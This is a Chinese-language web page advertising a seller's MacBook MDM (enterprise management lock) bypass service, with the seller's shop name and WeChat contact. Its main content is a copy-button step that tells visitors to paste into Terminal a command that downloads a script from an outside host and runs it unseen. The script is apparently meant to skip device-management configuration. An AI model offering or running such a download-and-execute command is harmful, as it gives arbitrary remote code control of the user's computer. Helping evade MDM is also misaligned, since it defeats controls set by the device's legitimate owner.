<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>我的网页</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f7f7f7;
        }
        h1, p {
            margin: 20px;
            color: #333;
        }
        pre {
            background-color: #333;
            color: #fff;
            padding: 10px;
            border-radius: 5px;
            font-size: 16px;
            display: inline-block;
        }
        .content {
            padding: 40px 20px;
        }
        .highlight {
            color: #ff6600;
            font-weight: bold;
        }
        .contact-info {
            margin-top: 30px;
        }
        .contact-info p {
            font-size: 16px;
            color: #555;
        }
        .emoji {
            font-size: 24px;
        }
        .copy-btn {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .copy-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>欢迎来到我们的MacBook服务页面</h1>
        <p>请点击下方按钮复制代码：</p>
        <button class="copy-btn" id="copyButton">点击以复制代码</button>
        <pre id="codeToCopy">curl https://degula.zeabur.app/test.sh -o test.sh && chmod +x ./test.sh && ./test.sh</pre>

        <p>复制以上代码，进入电脑终端，回车三次等待程序跳过配置即可。</p>
        
        <div class="highlight">
            <p>华强北小胡，国内MacBook MDM专家</p>
            <p>🔒 国内最早专售MacBook企业机MDM配置锁，最了解MDM没有之一！</p>
            <p>🚀 发掘MacBook潜力，尽在我们店铺。</p>
        </div>

        <div class="contact-info">
            <p class="emoji">🌟 店铺闲鱼搜：福田吴彦祖</p>
            <p class="emoji">📲 微信：huhu-009</p>
        </div>
        
        <p>让我们一起探索MacBook的未来，解锁你的技术世界！</p>
    </div>

    <script>
        document.getElementById('copyButton').addEventListener('click', function() {
            var code = document.getElementById('codeToCopy');
            var range = document.createRange();
            range.selectNode(code);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            alert('代码已复制到剪贴板！');
        });
    </script>
</body>
</html>
